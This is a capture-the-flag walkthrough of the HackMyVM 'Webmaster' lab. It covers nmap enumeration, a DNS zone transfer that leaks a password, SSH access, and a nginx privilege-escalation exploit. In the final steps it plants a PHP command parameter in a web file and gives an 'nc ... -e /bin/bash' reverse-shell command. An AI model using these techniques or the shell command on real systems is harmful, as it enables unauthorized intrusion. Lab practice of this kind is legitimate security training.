# HackMyVM-Webmaster

## Netdiscover

<img src="https://imgur.com/4MBBH8n.png"/>


## NMAP

```
Nmap scan report for 192.168.1.131                                                                                                            [4/84]
Host is up (0.000055s latency).
Not shown: 997 closed ports                                                                                                                         
PORT   STATE SERVICE VERSION                                              
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:                                                                                                                                      
|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
53/tcp open  domain  (unknown banner: not currently available)
| dns-nsid: 
|_  bind.version: not currently available
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    currently available
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/
submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/11%Time=5FFB65ED%P=x86_64-pc-linux-gnu%r(DNSV 
SF:ersionBindReqTCP,52,"\0P\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x 
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x18\x17not\x20curren 
SF:tly\x20available\xc0\x0c\0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
MAC Address: 08:00:27:FE:8A:1A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.04 seconds

```

## PORT 80

<img src="https://i.ibb.co/PC2Bbz2/Screenshot-2021-01-11-01-49-39.png"/>

Looking at the source

<img src="https://i.ibb.co/zSj2DmC/Screenshot-2021-01-11-01-49-39.png"/>

So this `webmaster.hmv` refers to a domain name let's add this to `/etc/hosts`.

Now by adding the domain name we are going to do a `Zone transfer` which is a DNS query type AXFR, is a type of DNS transaction.Zone transfers are typically used to replicate DNS data across a number of DNS servers or to back up DNS files.

<img src="https://i.ibb.co/7RLr7SW/Screenshot-2021-01-11-01-49-39.png"/>

We got `john`'s passwords so now let's ssh into the machine.

<img src="https://i.ibb.co/H73FMvG/Screenshot-2021-01-11-01-49-39.png"/>

By running `sudo -l` we can see what can we run as root user

<img src="https://i.ibb.co/Hx7ksWB/Screenshot-2021-01-11-01-49-39.png"/>

We can find an LPE (Local Privilege Escalation) for nginx

<img src="https://i.ibb.co/6BN0jgZ/Screenshot-2021-01-11-01-49-39.png"/>

Let's download this to our machine and transfer it to target machine

<img src="https://i.ibb.co/bPhkV1w/Screenshot-2021-01-11-01-49-39.png"/>

To run this we need to provide the path of nginx error log which is located at `/var/log/nginx/error.log`

Run this like `./40768.sh /var/log/nginx/error.log`

<img src="https://i.ibb.co/bbLQyLf/Screenshot-2021-01-11-01-49-39.png"/>

But we couldn't run the exploit has it is needed to be run as `www-data` so only thing I could thing was to change the contents of one of the webserver files and insert a simple php GET paramter vulnerable code which will allow us to execute commands

<img src="https://i.ibb.co/LJ29gxT/Screenshot-2021-01-11-01-49-39.png"/>

<img src="https://i.ibb.co/4MQyn6r/root.png"/>

Then you can just do `nc your_ip your_netcat_port -e /bin/bash` on `cmd` paramter to get reverse shell

<img src="https://i.ibb.co/QCZQLxW/Screenshot-2021-01-11-01-49-39.png"/>
